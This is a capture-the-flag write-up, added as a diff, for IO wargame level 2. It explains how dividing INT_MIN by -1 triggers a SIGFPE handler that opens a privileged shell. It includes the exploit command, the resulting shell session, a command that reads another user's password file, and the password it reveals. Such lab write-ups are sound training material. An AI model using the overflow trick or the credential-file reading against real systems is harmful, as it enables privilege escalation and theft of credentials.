@@ -1,0 +1,73 @@
+I/O – level 2
+
+The level 2 challenge has two binaries to choose from level02 or level02_alt and also the source code for both of the binaries, looking at the source code I decided I would attempt level02.c.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+//a little fun brought to you by bla
+ 
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;setjmp.h&gt;
+ 
+void catcher(int a)
+{
+        setresuid(geteuid(),geteuid(),geteuid());
+        printf(&quot;WIN!\n&quot;);
+        system(&quot;/bin/sh&quot;);
+        exit(0);
+}
+ 
+int main(int argc, char **argv)
+{
+        puts(&quot;source code is available in level02.c\n&quot;);
+ 
+        if (argc != 3 || !atoi(argv[2]))
+                return 1;
+        signal(SIGFPE, catcher);
+        return abs(atoi(argv[1])) / atoi(argv[2]);
+}
+It appears that the level2 binary is expecting 2 valid inputs, looking up the signal I see that “SIGFPE” is caused when the arithemetic operation of “divide by zero”, since we want the catcher function to trigger as it awards me with a shell we want to cause this type of exception. Attempting this we get the failed message, looking back at the code I saw that if statement actually prevent this because it checks for if the second argument “is not 0”. Performing a man signal I learnt that negative numbers could be used to generate SIGFPE exceptions which could potentially get around the check in the if statement.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+level2@io:~$ /levels/level02 -2147483648 -1
+source code is available in level02.c
+ 
+WIN!
+sh-4.2$ id
+uid=1003(level3) gid=1002(level2) groups=1003(level3),1002(level2),1029(nosu)
+ 
+sh-4.2$ cat /home/level3/.pass
+G2K2EP1luDpdNQ
+The password for the third level was “G2K2EP1luDpdNQ”.
